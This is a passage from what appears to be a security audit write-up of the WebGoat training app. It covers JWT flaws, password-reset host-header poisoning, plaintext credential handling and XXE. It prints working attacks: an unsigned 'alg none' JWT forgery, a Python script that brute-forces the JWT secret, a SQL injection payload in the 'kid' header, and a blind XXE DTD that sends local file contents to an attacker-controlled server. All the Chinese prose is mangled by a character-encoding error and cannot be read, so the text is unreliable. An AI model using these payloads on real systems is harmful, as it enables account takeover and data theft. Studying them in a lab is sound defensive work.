eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9# &#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;HS256&quot;&#125;#payload eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTUwNDAwNjQzNSwiZXhwIjoxNTA0MDA2NTU1LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0# &#123;&quot;iss&quot;:&quot;http:\\/\\/demo.sjoerdlangkemper.nl\\/&quot;,&quot;iat&quot;:1504006435,&quot;exp&quot;:1504006555,&quot;data&quot;:&#123;&quot;hello&quot;:&quot;world&quot;&#125;&#125;def b64urlencode(data):    return base64.b64encode(data).replace(b&#x27;+&#x27;, b&#x27;-&#x27;).replace(b&#x27;/&#x27;, b&#x27;_&#x27;).replace(b&#x27;=&#x27;, b&#x27;&#x27;)print(b64urlencode(b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;)+b&#x27;.&#x27;+b64urlencode(b&#x27;&#123;&quot;iat&quot;:1673470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Tom&quot;&#125;&#x27;)+b&#x27;.&#x27;)</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt10.png\" alt=\"\"></p>\n<p>jwtâ€“&gt;JWTSecretKeyEndpoint.login()</p>\n<p>éšæœºå–æ•°ç»„ä¸­çš„å€¼è¿›è¡ŒåŠ å¯†ï¼Œå¯ä»¥ç”¨å­—å…¸è¿›è¡Œçˆ†ç ´</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String[] SECRETS = &#123;<span class=\"string\">&quot;victory&quot;</span>, <span class=\"string\">&quot;business&quot;</span>, <span class=\"string\">&quot;available&quot;</span>, <span class=\"string\">&quot;shipping&quot;</span>, <span class=\"string\">&quot;washington&quot;</span>&#125;;<span class=\"keyword\">static</span> <span class=\"keyword\">final</span> String JWT_SECRET = TextCodec.BASE64.encode(SECRETS[<span class=\"keyword\">new</span> Random().nextInt(SECRETS.length)]);<span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">getSecretToken</span><span class=\"params\">()</span> </span>&#123;        <span class=\"keyword\">return</span> Jwts.builder()                .setIssuer(<span class=\"string\">&quot;WebGoat Token Builder&quot;</span>)                .setAudience(<span class=\"string\">&quot;webgoat.org&quot;</span>)                .setIssuedAt(Calendar.getInstance().getTime())                .setExpiration(Date.from(Instant.now().plusSeconds(<span class=\"number\">60</span>)))                .setSubject(<span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;username&quot;</span>, <span class=\"string\">&quot;Tom&quot;</span>)                .claim(<span class=\"string\">&quot;Email&quot;</span>, <span class=\"string\">&quot;tom@webgoat.org&quot;</span>)                .claim(<span class=\"string\">&quot;Role&quot;</span>, <span class=\"keyword\">new</span> String[]&#123;<span class=\"string\">&quot;Manager&quot;</span>, <span class=\"string\">&quot;Project Administrator&quot;</span>&#125;)                .signWith(SignatureAlgorithm.HS256, JWT_SECRET).compact();    &#125;</span><br></pre></td></tr></table></figure>\n<p>çˆ†ç ´è„šæœ¬ï¼ˆå­—å…¸ pass.txt ç”¨çš„æ˜¯æºç é‡Œé¢çš„æ•°ç»„ï¼‰ï¼ˆå¦‚æœè„šæœ¬æŠ¥é”™ jwt æ‰¾ä¸åˆ° jwt.exceptionsï¼Œå¯èƒ½æ˜¯ pyjwt çš„é—®é¢˜ï¼Œæ›´æ–° pyjwt&gt;=1.6.4 å³å¯ï¼Œ<a href=\"https://stackoverflow.com/questions/33198428/jwt-module-object-has-no-attribute-encode\">è§£å†³æ¥æº</a>ï¼‰ï¼š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> termcolorimport jwtif __name__ == <span class=\"string\">&quot;__main__&quot;</span>:    jwt_str = <span class=\"string\">&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTYxMTc5ODAxNSwiZXhwIjoxNjExNzk4MDc1LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.w1tzWDwmZcggbyV9ixcw1Vydf07MG9mAsPVbQPgBh2E&#x27;</span>    <span class=\"function\">with <span class=\"title\">open</span><span class=\"params\">(<span class=\"string\">&#x27;pass.txt&#x27;</span>)</span> as f:        <span class=\"keyword\">for</span> line in f:            key_ </span>= line.strip()            <span class=\"keyword\">try</span>:                jwt.decode(jwt_str, verify=True, key=key_, algorithms=<span class=\"string\">&quot;HS256&quot;</span>)                print(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>), <span class=\"string\">&#x27;&lt;--&#x27;</span>)                <span class=\"function\"><span class=\"keyword\">break</span>            <span class=\"title\">except</span> <span class=\"params\">(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError)</span>:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class=\"string\">&#x27;green&#x27;</span>)</span>, &#x27;&lt;--&#x27;)                <span class=\"keyword\">break</span>            except jwt.exceptions.InvalidSignatureError:                <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span> * <span class=\"number\">64</span>, <span class=\"string\">&#x27;\\r\\btry&#x27;</span>, key_, end=<span class=\"string\">&#x27;&#x27;</span>, flush=True)</span>                <span class=\"keyword\">continue</span>        <span class=\"keyword\">else</span>:            <span class=\"title\">print</span><span class=\"params\">(<span class=\"string\">&#x27;\\r&#x27;</span>, <span class=\"string\">&#x27;\\bsorry! no key be found.&#x27;</span>)</span></span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt12.png\" alt=\"\"></p>\n<p>çˆ†ç ´å‡ºæ¥ keyï¼Œå°±å¯ä»¥å» https://jwt.io/#debugger åŠ å·¥å•¦</p>\n<p><img src=\"pt13.png\" alt=\"\"></p>\n<p>jwtâ€“&gt;JWTRefreshEndpoint</p>\n<p>ç™»å½•æ—¶è°ƒç”¨ createNewTokens ()</p>\n<p>ä¼šè·å–åˆ°çš„ refresh token å’Œè¯¥ç”¨æˆ·çš„ access token</p>\n<p>refresh token æ˜¯é€šè¿‡ RandomStringUtils.randomAlphabetic (20) è·å–çš„éšæœºå€¼ï¼Œç”¨äºåˆ·æ–°è¿‡æœŸçš„ access token</p>\n<p>ä½†æ˜¯ç”±äºæ²¡æœ‰ç»‘å®šç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥åˆ·æ–°ä»»ä½•ä»»ä½•ç”¨æˆ·çš„è¿‡æœŸ token</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Map&lt;String, Object&gt; tokenJson = <span class=\"keyword\">new</span> HashMap&lt;&gt;();        String refreshToken = RandomStringUtils.randomAlphabetic(<span class=\"number\">20</span>);        validRefreshTokens.add(refreshToken);        tokenJson.put(<span class=\"string\">&quot;access_token&quot;</span>, token);        tokenJson.put(<span class=\"string\">&quot;refresh_token&quot;</span>, refreshToken);        <span class=\"keyword\">return</span> tokenJson;</span><br></pre></td></tr></table></figure>\n<p>token åˆ·æ–°ï¼Œè¯·æ±‚åŒ…ä¸­çš„ refresh_token è¢«åŒ…å«åœ¨éšæœºç”Ÿæˆçš„ token é›†åˆä¸­æ—¶ï¼Œå°±è¿”å›ä¸€ä¸ªæ–°çš„ tokenï¼š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (user == <span class=\"keyword\">null</span> || refreshToken == <span class=\"keyword\">null</span>) &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validRefreshTokens.contains(refreshToken)) &#123;            validRefreshTokens.remove(refreshToken);            <span class=\"keyword\">return</span> ok(createNewTokens(user));        &#125; <span class=\"keyword\">else</span> &#123;            <span class=\"keyword\">return</span> ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();        &#125;</span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>åˆ©ç”¨ç™»å½•æ¥å£ï¼Œç™»å½•å½“å‰ç”¨æˆ· jerryï¼Œè·å–åˆ·æ–° refresh_token</p>\n<p><img src=\"pt14.png\" alt=\"\"></p>\n<p>æ²¡æœ‰æˆåŠŸåˆ·æ–° tokenï¼ŒæŠ¥é”™ä¿¡æ¯ï¼šç»™å‡ºçš„ token æ— æ³•æ­£å¸¸è§£æ</p>\n<p>jwtâ€“&gt;JWTFinalEndpoint.resetVotes()</p>\n<p>å­˜åœ¨ sql æ³¨å…¥ç‚¹ &quot;kid&quot;(KID ä»£è¡¨ â€œå¯†é’¥åºå·â€ï¼ˆKey IDï¼‰ã€‚å®ƒæ˜¯ JWT å¤´éƒ¨çš„ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œå¼€å‘äººå‘˜å¯ä»¥ç”¨å®ƒæ ‡è¯†è®¤è¯ token çš„æŸä¸€å¯†é’¥)</p>\n<p>å¯ä»¥é€šè¿‡ union è¿›è¡Œç»•è¿‡ï¼Œå°† &quot;key&quot; ä½œä¸ºè®¤è¯å¯†é’¥ï¼Œä½¿ç”¨<a href=\"https://jwt.io/#debugger\">åœ¨çº¿å·¥å…·</a>ä¼ªé€  token</p>\n<p>è¿™é‡Œå°†æ•°æ®åº“å–å‡ºçš„ key ç”¨ base64 è§£ç äº†ï¼Œæ‰€ä»¥åœ¨æ³¨å…¥çš„æ—¶å€™è¦æ³¨å…¥ key çš„ base ç¼–ç </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa<span class=\"string\">&#x27; union select &#x27;</span>a2V5<span class=\"string\">&#x27; from jwt_keys where id=&#x27;</span>webgoat_key</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">final</span> String kid = (String) header.get(<span class=\"string\">&quot;kid&quot;</span>);                        <span class=\"keyword\">try</span> (<span class=\"keyword\">var</span> connection = dataSource.getConnection()) &#123;                            ResultSet rs = connection.createStatement().executeQuery(<span class=\"string\">&quot;SELECT key FROM jwt_keys WHERE id = &#x27;&quot;</span> + kid + <span class=\"string\">&quot;&#x27;&quot;</span>);                            <span class=\"keyword\">while</span> (rs.next()) &#123;                                <span class=\"keyword\">return</span> TextCodec.BASE64.decode(rs.getString(<span class=\"number\">1</span>));                            &#125;                        &#125;</span><br></pre></td></tr></table></figure>\n<p>å»ºè®®</p>\n<ol>\n<li>ä¿è¯å¯†é’¥çš„ä¿å¯†æ€§</li>\n<li>ç­¾åç®—æ³•å›ºå®šåœ¨åç«¯ï¼Œä¸ä»¥ JWT é‡Œçš„ç®—æ³•ä¸ºæ ‡å‡†</li>\n<li>é¿å…æ•æ„Ÿä¿¡æ¯ä¿å­˜åœ¨ JWT ä¸­</li>\n<li>å°½é‡ JWT çš„æœ‰æ•ˆæ—¶é—´è¶³å¤ŸçŸ­</li>\n<li>å°½é‡é¿å…ç”¨ç”¨æˆ·å¯ä»¥è·å–çš„å‚æ•°åˆ·æ–° tokenï¼Œé¿å…é€»è¾‘ç»•è¿‡</li>\n<li>æ³¨æ„ header éƒ¨åˆ†ï¼Œè‹¥æœ‰ sql è¯­å¥ï¼Œå»ºè®®ä½¿ç”¨é¢„ç¼–è¯‘</li>\n</ol>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>a2v5 æ˜¯ key çš„ base64 ç¼–ç </p>\n<p><img src=\"pt15.png\" alt=\"\"></p>\n<p><img src=\"pt16.png\" alt=\"\"></p>\n</li>\n<li>\n<p>å®‰å…¨é—®é¢˜</p>\n<p>password_resetâ€“&gt;QuestionsAssignment</p>\n<p>å¯†ä¿é—®é¢˜è®¾ç½®ä¸ºï¼Œä½ æœ€å–œæ¬¢çš„é¢œè‰²æ˜¯ä»€ä¹ˆï¼Œå¯ä»¥ç›´æ¥ç”¨å¸¸è§é¢œè‰²ç”Ÿæˆå­—å…¸è¿›è¡Œçˆ†ç ´ï¼Œå»ºè®®ä½¿ç”¨æ›´å¤æ‚çš„éš¾ä»¥ç ´è§£çš„é—®é¢˜ï¼Œå¹¶ä¸”é™åˆ¶è¾“å…¥æ¬¡æ•°</p>\n<p><img src=\"ba01.png\" alt=\"\"></p>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"pt17.png\" alt=\"\"></p>\n<p>password_resetâ€“&gt;ResetLinkAssignmentForgotPassword</p>\n<p>å‚æ•° host æ˜¯ä» Request å¤´éƒ¨è·å–çš„ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶ host å‚æ•°ï¼Œç»™ç”¨æˆ·å‘é€ä¸€ä¸ªæˆ‘ä»¬æ§åˆ¶çš„ linkï¼Œç”¨æˆ·ç‚¹å‡»åè®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨è®°å½•è¯¥è¯·æ±‚ï¼Œä»è€Œè·å–åˆ°åé¢çš„ resetLinkï¼Œç„¶åæˆ‘ä»¬å†é€šè¿‡æ­£å¸¸çš„è®¿é—®ä¿®æ”¹å¯†ç </p>\n</li>\n</ol>\n<p>ä¿®å¤å»ºè®®ï¼š</p>\n<pre><code>1. ç¦æ­¢å°†ç”¨æˆ·å¯æ§çš„å‚æ•°æ‹¼æ¥è¿›å¯†ç é‡ç½®link2. é‡ç½®é“¾æ¥åº”è¯¥æ˜¯ä¸€æ¬¡æ€§æœ‰æ•ˆçš„\n</code></pre>\n   <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">fakeClickingLinkEmail</span><span class=\"params\">(String host, String resetLink)</span> </span>&#123;        <span class=\"keyword\">try</span> &#123;            HttpHeaders httpHeaders = <span class=\"keyword\">new</span> HttpHeaders();            HttpEntity httpEntity = <span class=\"keyword\">new</span> HttpEntity(httpHeaders);            <span class=\"keyword\">new</span> RestTemplate().exchange(String.format(<span class=\"string\">&quot;http://%s/PasswordReset/reset/reset-password/%s&quot;</span>, host, resetLink), HttpMethod.GET, httpEntity, Void.class);        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;         <span class=\"comment\">//don&#x27;t care        &#125;    &#125;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>æ”»å‡»è€…æœåŠ¡å™¨è®°å½•äº†è¯·æ±‚</p>\n<p><img src=\"pt18.png\" alt=\"\"></p>\n<h1 id=\"ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨\"><a class=\"markdownIt-Anchor\" href=\"#ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨\">#</a> ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ä¼ è¾“ä¸å­˜å‚¨</h1>\n<h2 id=\"æ¼æ´æè¿°-5\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-5\">#</a> æ¼æ´æè¿°</h2>\n<p>ç³»ç»Ÿæœªå¯¹ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚å¯†ç ã€èº«ä»½è¯å·ã€ç”µè¯å·ç ã€é“¶è¡Œå¡å·ç­‰ï¼‰è¿›è¡ŒåŠ å¯†ã€è„±æ•ç­‰æ“ä½œï¼Œå¯¼è‡´ç”¨æˆ·ä¿¡æ¯å­˜åœ¨æ³„éœ²çš„é£é™©ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -5\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -5\">#</a> æ¼æ´æˆå› </h2>\n<p>æäº¤ç™»å½•è¯·æ±‚æ—¶ï¼Œæ²¡æœ‰å¯¹å¯†ç è¿›è¡ŒåŠ å¯†</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-5\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-5\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<p>å‰ç«¯å­˜å‚¨çš„ç”¨æˆ·åå’Œå¯†ç </p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submit_secret_credentials</span>(<span class=\"params\"></span>) </span>&#123;    <span class=\"keyword\">var</span> xhttp = <span class=\"keyword\">new</span> XMLHttpRequest();    xhttp[<span class=\"string\">&#x27;open&#x27;</span>](<span class=\"string\">&#x27;POST&#x27;</span>, <span class=\"string\">&#x27;#attack/307/100&#x27;</span>, <span class=\"literal\">true</span>);\t<span class=\"comment\">//sending the request is obfuscated, to descourage js reading\tvar _0xb7f9=[&quot;\\x43\\x61\\x70\\x74\\x61\\x69\\x6E\\x4A\\x61\\x63\\x6B&quot;,&quot;\\x42\\x6C\\x61\\x63\\x6B\\x50\\x65\\x61\\x72\\x6C&quot;,&quot;\\x73\\x74\\x72\\x69\\x6E\\x67\\x69\\x66\\x79&quot;,&quot;\\x73\\x65\\x6E\\x64&quot;];xhttp[_0xb7f9[3]](JSON[_0xb7f9[2]](&#123;username:_0xb7f9[0],password:_0xb7f9[1]&#125;))&#125;</span></span><br></pre></td></tr></table></figure>\n<p>è°ƒç”¨è¯¥å‡½æ•°çš„å‘åŒ…æˆªå›¾ï¼š</p>\n<p><img src=\"se01.png\" alt=\"\"></p>\n<p>å»ºè®®åœ¨æ•°æ®ä¼ è¿‡ç¨‹ä¸­ï¼Œå¯¹ç”¨æˆ·çš„æ•æ„Ÿæ•°æ®è¿›è¡ŒåŠ å¯†</p>\n<h1 id=\"xmlå¤–éƒ¨å®ä½“æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#xmlå¤–éƒ¨å®ä½“æ³¨å…¥\">#</a> XML å¤–éƒ¨å®ä½“æ³¨å…¥</h1>\n<h2 id=\"æ¼æ´æè¿°-6\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-6\">#</a> æ¼æ´æè¿°</h2>\n<p>XXEï¼ˆXML External Entity Injectionï¼‰æ˜¯ä¸€ç§é’ˆå¯¹ XML ç»ˆç«¯å®æ–½çš„æ”»å‡»ï¼Œæ¼æ´äº§ç”Ÿçš„æ ¹æœ¬åŸå› å°±æ˜¯åœ¨ XML1.0 æ ‡å‡†ä¸­å¼•å…¥äº† â€œentityâ€ è¿™ä¸ªæ¦‚å¿µï¼Œä¸” â€œentityâ€ å¯ä»¥åœ¨é¢„å®šä¹‰çš„æ–‡æ¡£ä¸­è¿›è¡Œè°ƒç”¨ï¼ŒXXE æ¼æ´çš„åˆ©ç”¨å°±æ˜¯é€šè¿‡å®ä½“çš„æ ‡è¯†ç¬¦è®¿é—®æœ¬åœ°æˆ–è€…è¿œç¨‹å†…å®¹ã€‚é»‘å®¢æƒ³è¦å®æ–½è¿™ç§æ”»å‡»ï¼Œéœ€è¦åœ¨ XML çš„ payload åŒ…å«å¤–éƒ¨å®ä½“å£°æ˜ï¼Œä¸”æœåŠ¡å™¨æœ¬èº«å…è®¸å®ä½“æ‰©å±•ã€‚è¿™æ ·çš„è¯ï¼Œé»‘å®¢æˆ–è®¸èƒ½è¯»å– WEB æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé€šè¿‡ UNC è·¯å¾„è®¿é—®è¿œç¨‹æ–‡ä»¶ç³»ç»Ÿï¼Œæˆ–è€…é€šè¿‡ HTTP/HTTPS è¿æ¥åˆ°ä»»æ„ä¸»æœºã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -6\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -6\">#</a> æ¼æ´æˆå› </h2>\n<p>XML è§£ææ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„è§£æï¼Œä¸”ç”¨æˆ·å¯æ§ REST XML æ ¼å¼çš„å‚æ•°ã€‚</p>\n<h2 id=\"ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-6\"><a class=\"markdownIt-Anchor\" href=\"#ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®-6\">#</a> ä»£ç ç‰‡æ®µä»¥åŠä¿®å¤å»ºè®®</h2>\n<ol>\n<li>\n<p>xxeâ€“&gt;SimpleXXE.createNewComment()</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">boolean</span> secure = <span class=\"keyword\">false</span>;     \t<span class=\"keyword\">if</span> (<span class=\"keyword\">null</span> != request.getSession().getAttribute(<span class=\"string\">&quot;applySecurity&quot;</span>)) &#123;     \t\tsecure = <span class=\"keyword\">true</span>;     \t&#125;         Comment comment = comments.parseXml(commentStr, secure);         comments.addComment(comment, <span class=\"keyword\">false</span>);         <span class=\"keyword\">if</span> (checkSolution(comment)) &#123;             <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).build();         &#125;</span><br></pre></td></tr></table></figure>\n<p>å…¶ä¸­è°ƒç”¨ Comment çš„ parseXml (commentStr, secure) æ–¹æ³•è¿›è¡Œ xml è§£æ<br>\næ­£å¦‚ä»£ç ä¸­æ‰€ç¤ºï¼Œå¯ä»¥é€šè¿‡è®¾ç½® XMLConstants çš„ä¸¤ä¸ªå±æ€§æ¥ç¦ç”¨å¤–éƒ¨å®ä½“è§£æï¼Œé»˜è®¤çš„ç©ºå­—ç¬¦ä¸²å°±æ˜¯ç¦ç”¨ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šåè®®ç­‰ã€‚</p>\n</li>\n</ol>\n<p>è¯¦ç»†ä¿¡æ¯å¯ä»¥çœ‹ XMLConstants ä¸­çš„æ³¨é‡Šã€‚</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> jc = JAXBContext.newInstance(Comment.class);     <span class=\"keyword\">var</span> xif = XMLInputFactory.newInstance();   <span class=\"keyword\">if</span> (secure) &#123;        \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, <span class=\"string\">&quot;&quot;</span>); <span class=\"comment\">// Compliant     \txif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;);  // compliant        &#125;                   var xsr = xif.createXMLStreamReader(new StringReader(xml));            var unmarshaller = jc.createUnmarshaller();        return (Comment) unmarshaller.unmarshal(xsr);</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"xxe01.png\" alt=\"\"></p>\n<ol start=\"2\">\n<li>\n<p>xxeâ€“&gt;ContentTypeAssignment.createNewUser()</p>\n<p>æ ¹æ® contentType åˆ¤æ–­æ•°æ®æ ¼å¼ï¼Œxml è§£æå’Œ 1 ä¸€æ ·ï¼Œå…¶ä½™åŒä¸Š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// å¦‚æœæ˜¯xmlæ ¼å¼        if (null != contentType &amp;&amp; contentType.contains(MediaType.APPLICATION_XML_VALUE)) &#123;            String error = &quot;&quot;;            try &#123;            \tboolean secure = false;            \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;            \t\tsecure = true;            \t&#125;                Comment comment = comments.parseXml(commentStr, secure);                comments.addComment(comment, false);                if (checkSolution(comment)) &#123;                    attackResult = success(this).build();                &#125;            &#125;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p><img src=\"xxe02.png\" alt=\"\"></p>\n<p><img src=\"xxe03.png\" alt=\"\"></p>\n</li>\n<li>\n<p>xxeâ€“&gt;ContentTypeAssignment.addComment()</p>\n<p>è¿™é‡Œä½œè€…ä¸ºäº†å¼„ä¸€ä¸ª blind xxeï¼Œç‰¹åˆ«è®¾ç½®äº†æäº¤æ­£ç¡®çš„å†…å®¹æ‰è¿”å› success</p>\n<p>xml è§£æä»£ç å¹¶æ²¡æœ‰æ”¹å˜</p>\n<p>å®é™…ä¸Šè¿˜æ˜¯é€šè¿‡å‚æ•°å®ä½“æ³¨å…¥ï¼ˆå‚æ•°å®ä½“ä¹Ÿèƒ½è¢«å¤–éƒ¨å¼•ç”¨ï¼‰ï¼Œä¸ºäº†çœ‹åˆ°æ•°æ®æ‰€ä»¥è¦é€šè¿‡ç›²æ‰“çš„æ–¹å¼ï¼Œå°† WEB æœåŠ¡å™¨çš„æœ¬åœ°æ–‡ä»¶å†…å®¹å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨</p>\n<p>ä¿®å¤å»ºè®®åŒä¸Š</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &#123;            return success(this).build();        &#125;        try &#123;        \tboolean secure = false;        \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;        \t\tsecure = true;        \t&#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &#123;                comment.setText(&quot;Nice try, you need to send the file to WebWolf&quot;);            &#125;            comments.addComment(comment, false);        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>æµ‹è¯•æˆªå›¾ï¼š</p>\n<p>a.dtd ä¸Šä¼ åœ¨æ”»å‡»æœåŠ¡å™¨ä¸Š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload  &quot;&lt;!ENTITY attack SYSTEM &#x27;http://127.0.0.1:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xxe04.png\" alt=\"\"></p>\n<p>æ•°æ®é€šè¿‡å®ä½“å¼•ç”¨æˆåŠŸå›æ˜¾å•¦</p>\n<p><img src=\"xxe05.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"æ°´å¹³è¶Šæƒ\"><a class=\"markdownIt-Anchor\" href=\"#æ°´å¹³è¶Šæƒ\">#</a> æ°´å¹³è¶Šæƒ</h1>\n<h2 id=\"æ¼æ´æè¿°-7\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æè¿°-7\">#</a> æ¼æ´æè¿°</h2>\n<p>æ°´å¹³è¶Šæƒæ¼æ´ï¼Œæ˜¯ä¸€ç§ â€œåŸºäºæ•°æ®çš„è®¿é—®æ§åˆ¶â€ è®¾è®¡ç¼ºé™·å¼•èµ·çš„æ¼æ´ã€‚ç”±äºæœåŠ¡å™¨ç«¯åœ¨æ¥æ”¶åˆ°è¯·æ±‚æ•°æ®è¿›è¡Œæ“ä½œæ—¶ï¼Œæ²¡æœ‰åˆ¤æ–­æ•°æ®çš„æ‰€å±äººï¼Œè€Œå¯¼è‡´çš„è¶Šæƒæ•°æ®è®¿é—®æ¼æ´ã€‚å¦‚æœåŠ¡å™¨ç«¯ä»å®¢æˆ·ç«¯æäº¤çš„ request å‚æ•°ï¼ˆç”¨æˆ·å¯æ§æ•°æ®ï¼‰ä¸­è·å–ç”¨æˆ· idï¼Œæ¶æ„æ”»å‡»è€…é€šè¿‡å˜æ¢è¯·æ±‚ ID çš„å€¼ï¼ŒæŸ¥çœ‹æˆ–ä¿®æ”¹ä¸å±äºæœ¬äººçš„æ•°æ®ã€‚</p>\n<h2 id=\"æ¼æ´æˆå› -7\"><a class=\"markdownIt-Anchor\" href=\"#æ¼æ´æˆå› -7\">#</a> æ¼æ´æˆå› 